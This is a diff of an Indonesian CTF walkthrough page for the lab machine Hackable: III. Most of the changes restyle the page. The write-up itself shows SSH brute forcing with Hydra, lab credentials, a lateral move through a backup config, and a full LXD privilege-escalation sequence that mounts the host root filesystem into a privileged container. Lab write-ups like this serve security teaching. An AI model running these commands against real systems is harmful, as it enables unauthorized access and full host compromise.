+                ✅ <strong>BERHASIL:</strong> Port 22 sekarang berstatus <code>open</code>.
             </div>
             <p>Selanjutnya, unduh <em>wordlist</em> dari direktori <code>/backup/</code> dan lakukan <em>brute force</em> menggunakan Hydra dengan username <code>jubiscleudo</code>.</p>
             <div class="code-block" data-lang="bash">
-                <code>wget http://192.168.56.103/backup/wordlist.txt<br>hydra -l jubiscleudo -P wordlist.txt ssh://192.168.56.103</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <code>wget http://192.168.56.103/backup/wordlist.txt
+hydra -l jubiscleudo -P wordlist.txt ssh://192.168.56.103</code>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
             <div class="success">
-                ✅ <strong>Kredensial SSH Ditemukan:</strong><br>
+                ✅ <strong>KREDENSIAL SSH DITEMUKAN:</strong><br>
                 Username: <code>jubiscleudo</code><br>
                 Password: <code>onlymy</code>
             </div>
         </div>
 
         <!-- STEP 5 -->
-        <div class="step-card reveal" data-step="Langkah 5">
-            <h2>🚩 User Flag & Lateral Movement</h2>
+        <div class="step-card reveal" data-step="STEP_05">
+            <h2>USER FLAG & LATERAL MOVEMENT</h2>
             <p>Login ke SSH menggunakan kredensial di atas.</p>
             <div class="code-block" data-lang="bash">
                 <code>ssh jubiscleudo@192.168.56.103</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
             <p>Setelah masuk, cari file tersembunyi di direktori home. Kamu akan menemukan <strong><code>.user.txt</code></strong> (User Flag pertama).</p>
             <div class="code-block" data-lang="bash">
-                <code>ls -la<br>cat .user.txt</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <code>ls -la
+cat .user.txt</code>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
             <p>Selanjutnya, kita perlu mencari kredensial user lain. Periksa direktori web server:</p>
             <div class="code-block" data-lang="bash">
-                <code>ls -la /var/www/html/<br>cat /var/www/html/.backup_config.php</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <code>ls -la /var/www/html/
+cat /var/www/html/.backup_config.php</code>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
             <p>Di dalam file <code>.backup_config.php</code>, terdapat kredensial untuk user <code>hackable_3</code>.</p>
             <div class="success">
-                ✅ <strong>Kredensial Database/User Ditemukan:</strong><br>
+                ✅ <strong>KREDENSIAL DATABASE/USER DITEMUKAN:</strong><br>
                 Username: <code>hackable_3</code><br>
                 Password: <code>TrOLLED_3</code>
             </div>
             <p>Pindah ke user tersebut:</p>
             <div class="code-block" data-lang="bash">
                 <code>su hackable_3</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
         </div>
 
         <!-- STEP 6 -->
-        <div class="step-card reveal" data-step="Langkah 6">
-            <h2>👑 Privilege Escalation (LXD Exploit)</h2>
+        <div class="step-card reveal" data-step="STEP_06">
+            <h2>PRIVILEGE ESCALATION (LXD EXPLOIT)</h2>
             <p>Cek identitas user <code>hackable_3</code> dengan perintah <code>id</code>. Kamu akan melihat bahwa user ini adalah anggota grup <strong><code>lxd</code></strong>. Ini adalah celah eskalasi privilege yang sangat ampuh.</p>
             
             <p><strong>1. Perbarui Sesi Grup</strong></p>
             <p>Karena kita baru saja pindah user, kita perlu mengaktifkan grup <code>lxd</code> di sesi terminal saat ini.</p>
             <div class="code-block" data-lang="bash">
                 <code>newgrp lxd</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
 
             <p><strong>2. Build & Transfer Image Alpine</strong></p>
             <p>Di Kali Linux (bukan di SSH target), build image Alpine untuk LXD, lalu transfer ke target menggunakan Python HTTP Server.</p>
             <div class="code-block" data-lang="bash">
-                <code># Di Kali Linux:<br>git clone https://github.com/saghul/lxd-alpine-builder.git<br>cd lxd-alpine-builder<br>sudo ./build-alpine<br><br># Jalankan server HTTP<br>python3 -m http.server 8000</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <code># Di Kali Linux:
+git clone https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+sudo ./build-alpine
+
+# Jalankan server HTTP
+python3 -m http.server 8000</code>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
             <p>Di terminal SSH target (masuk ke direktori <code>/tmp</code>), unduh file image tersebut:</p>
             <div class="code-block" data-lang="bash">
-                <code>cd /tmp<br>wget http://192.168.56.102:8000/alpine-v3.24-x86_64-*.tar.gz</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <code>cd /tmp
+wget http://192.168.56.102:8000/alpine-v3.24-x86_64-*.tar.gz</code>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
 
             <p><strong>3. Eksekusi LXD</strong></p>
             <p>Jalankan perintah berikut di terminal SSH target untuk membuat container dengan hak akses penuh dan me-mount direktori host.</p>
             <div class="code-block" data-lang="bash">
-                <code>lxd init --auto<br>lxc image import ./alpine-v3.24-x86_64-*.tar.gz --alias myimage<br>lxc init myimage ignite -c security.privileged=true<br>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true<br>lxc start ignite<br>lxc exec ignite /bin/sh</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <code>lxd init --auto
+lxc image import ./alpine-v3.24-x86_64-*.tar.gz --alias myimage
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh</code>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
 
             <p><strong>4. Ambil Root Flag</strong></p>
             <p>Setelah masuk ke dalam container (prompt berubah menjadi <code>~ #</code>), akses direktori root host dan baca flag-nya.</p>
             <div class="code-block" data-lang="bash">
-                <code>cd /mnt/root/root<br>cat root.txt</code>
-                <span class="copy-hint">Klik untuk copy</span>
+                <code>cd /mnt/root/root
+cat root.txt</code>
+                <span class="copy-hint">[ CLICK_TO_COPY ]</span>
             </div>
         </div>
 
         <!-- FLAGS SECTION -->
         <div class="flag-container reveal">
-            <h3>🏁 Flags Ditemukan</h3>
+            <h3>🏁 FLAGS DITEMUKAN</h3>
             
             <!-- USER FLAG -->
             <div class="flag-box">
-                <h4 style="color: var(--accent-blue);">1. User Flag</h4>
+                <h4 style="color: var(--neon-blue);">1. USER FLAG</h4>
                 <p style="color: var(--text-muted); font-size: 0.9em; margin-bottom: 15px;">Ditemukan di dalam file <code>/home/jubiscleudo/.user.txt</code> setelah login sebagai user <code>jubiscleudo</code>.</p>
                 
                 <div class="ascii-art">
@@ -660,12 +560,12 @@
 %                          &&&           &&%&           %%%%          .&&&                           
 %                         &&%                                           &&&                          
 %                        %&&.   *&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&&    /&&(                         
-%                       /&&#   #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   %&&                         
-%                       &&%    ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%     %&%                        
-%                      &&&      %&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&      %&&                       
-%                      &&&      &&&&&&&&&&&&&&&%&   %&&&&&&&&&&&&&&&%      &&&                       
-%                      %&&&%    &&&&&&&&&&&&&&&&     &&&&&&&&&&&&&&&%    &%&&#                       
-%                        &&&&&&&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                         
+%                       /&&#   #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   %&&                        
+%                       &&%    ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%     %&%                       
+%                      &&&      %&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&      %&&                      
+%                      &&&      &&&&&&&&&&&&&&&%&   %&&&&&&&&&&&&&&&%      &&&                      
+%                      %&&&%    &&&&&&&&&&&&&&&&     &&&&&&&&&&&&&&&%    &%&&#                      
+%                        &&&&&&&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                        
 %                           &%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                            
 %                                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                                 
 %                                *&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                                  
@@ -680,7 +580,7 @@
 
             <!-- ROOT FLAG -->
             <div class="flag-box">
-                <h4 style="color: var(--accent-purple);">2. Root Flag</h4>
+                <h4 style="color: var(--neon-purple);">2. ROOT FLAG</h4>
                 <p style="color: var(--text-muted); font-size: 0.9em; margin-bottom: 15px;">Ditemukan di dalam direktori <code>/root/root.txt</code> setelah berhasil melakukan eskalasi hak akses (LXD).</p>
                 
                 <div class="ascii-art">
@@ -723,40 +623,159 @@
                 </a>
             </div>
             
-            <p style="margin-top: 25px; color: var(--text-muted); text-align: center;">Selamat! Anda telah menyelesaikan tantangan Hackable: III dan mendapatkan kedua flag.</p>
+            <p style="margin-top: 25px; color: var(--text-muted); text-align: center; font-family: var(--font-mono);">// SYSTEM_COMPROMISED_SUCCESSFULLY</p>
         </div>
 
         <!-- FOOTER -->
         <footer>
-            <p>&copy; 2026 Pixel Detective. Write-Up by <strong>Pixel</strong>.</p>
-            <p>Materi pembelajaran CTF & Penetration Testing.</p>
+            <p>&copy; 2026 PIXEL_DETECTIVE. WRITE-UP BY <strong>PIXEL</strong>.</p>
+            <p>// MATERI PEMBELAJARAN CTF & PENETRATION TESTING</p>
         </footer>
     </div>
 
-    <!-- === JAVASCRIPT === -->
+    <!-- Back to Top -->
+    <div id="back-to-top">▲</div>
+
+    <!-- JavaScript -->
     <script>
-        // 1. Fitur Copy-to-Clipboard untuk Code Blocks
+        // 1. Logika Kursor Kustom
+        const cursor = document.getElementById('cursor');
+        const trail = document.getElementById('cursor-trail');
+        let mouseX = 0, mouseY = 0, trailX = 0, trailY = 0;
+
+        document.addEventListener('mousemove', (e) => {
+            mouseX = e.clientX;
+            mouseY = e.clientY;
+            cursor.style.left = mouseX + 'px';
+            cursor.style.top = mouseY + 'px';
+        });
+
+        function animateTrail() {
+            trailX += (mouseX - trailX) * 0.15;
+            trailY += (mouseY - trailY) * 0.15;
+            trail.style.left = trailX + 'px';
+            trail.style.top = trailY + 'px';
+            requestAnimationFrame(animateTrail);
+        }
+        animateTrail();
+
+        const interactiveElements = document.querySelectorAll('a, button, .code-block, .btn, .nav-link');
+        interactiveElements.forEach(el => {
+            el.addEventListener('mouseenter', () => cursor.classList.add('hovering'));
+            el.addEventListener('mouseleave', () => cursor.classList.remove('hovering'));
+        });
+
+        // 2. Logika Partikel Background
+        const canvas = document.getElementById('particle-canvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        class Particle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.size = Math.random() * 2 + 0.5;
+                this.speedX = Math.random() * 1 - 0.5;
+                this.speedY = Math.random() * 1 - 0.5;
+                this.color = Math.random() > 0.5 ? '#bc13fe' : '#00f0ff';
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                if (this.x > canvas.width) this.x = 0;
+                if (this.x < 0) this.x = canvas.width;
+                if (this.y > canvas.height) this.y = 0;
+                if (this.y < 0) this.y = canvas.height;
+
+                let dx = mouseX - this.x;
+                let dy = mouseY - this.y;
+                let distance = Math.sqrt(dx * dx + dy * dy);
+                if (distance < 100) {
+                    this.x -= dx * 0.05;
+                    this.y -= dy * 0.05;
+                }
+            }
+            draw() {
+                ctx.fillStyle = this.color;
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fill();
+            }
+        }
+
+        function initParticles() {
+            particles = [];
+            let numParticles = Math.min(100, window.innerWidth / 15);
+            for (let i = 0; i < numParticles; i++) {
+                particles.push(new Particle());
+            }
+        }
+        initParticles();
+
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => {
+                p.update();
+                p.draw();
+            });
+            requestAnimationFrame(animateParticles);
+        }
+        animateParticles();
+
+        // 3. Progress Bar & Back to Top
+        window.addEventListener('scroll', () => {
+            const scrollTop = document.documentElement.scrollTop;
+            const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+            const progress = (scrollTop / scrollHeight) * 100;
+            document.getElementById('progress-bar').style.width = progress + '%';
+
+            const backToTop = document.getElementById('back-to-top');
+            if (scrollTop > 500) {
+                backToTop.classList.add('show');
+            } else {
+                backToTop.classList.remove('show');
+            }
+        });
+
+        document.getElementById('back-to-top').addEventListener('click', () => {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+
+        // 4. Copy-to-Clipboard untuk Code Blocks
         document.querySelectorAll('.code-block').forEach(block => {
             block.addEventListener('click', () => {
                 const text = block.querySelector('code').innerText;
                 navigator.clipboard.writeText(text).then(() => {
-                    const originalColor = block.style.borderColor;
-                    block.style.borderColor = 'var(--accent-green)';
-                    block.style.boxShadow = '0 0 10px rgba(63, 185, 80, 0.3)';
+                    const originalBorder = block.style.borderLeftColor;
+                    block.style.borderLeftColor = 'var(--neon-green)';
+                    block.style.boxShadow = '0 0 15px rgba(0, 255, 65, 0.3)';
                     
+                    const hint = block.querySelector('.copy-hint');
+                    if(hint) {
+                        const originalText = hint.innerText;
+                        hint.innerText = '[ COPIED! ]';
+                        setTimeout(() => {
+                            hint.innerText = originalText;
+                        }, 1500);
+                    }
+
                     setTimeout(() => {
-                        block.style.borderColor = originalColor;
+                        block.style.borderLeftColor = originalBorder;
                         block.style.boxShadow = 'none';
-                    }, 500);
-                }).catch(err => {
-                    console.error('Gagal menyalin teks: ', err);
-                });
+                    }, 1000);
+                }).catch(err => console.error('Gagal menyalin: ', err));
             });
         });
 
-        // 2. Animasi Scroll Reveal menggunakan Intersection Observer
+        // 5. Animasi Scroll Reveal
         const revealElements = document.querySelectorAll('.reveal');
-
         const revealObserver = new IntersectionObserver((entries, observer) => {
             entries.forEach(entry => {
                 if (entry.isIntersecting) {
@@ -764,16 +783,11 @@
                     observer.unobserve(entry.target);
                 }
             });
-        }, {
-            threshold: 0.1,
-            rootMargin: "0px 0px -50px 0px"
-        });
+        }, { threshold: 0.1, rootMargin: "0px 0px -50px 0px" });
 
-        revealElements.forEach(el => {
-            revealObserver.observe(el);
-        });
+        revealElements.forEach(el => revealObserver.observe(el));
 
-        console.log("Hackable III Write-Up Loaded Successfully with Download Link!");
+        console.log("HACKABLE III WRITE-UP LOADED SUCCESSFULLY");
     </script>
 </body>
 </html>
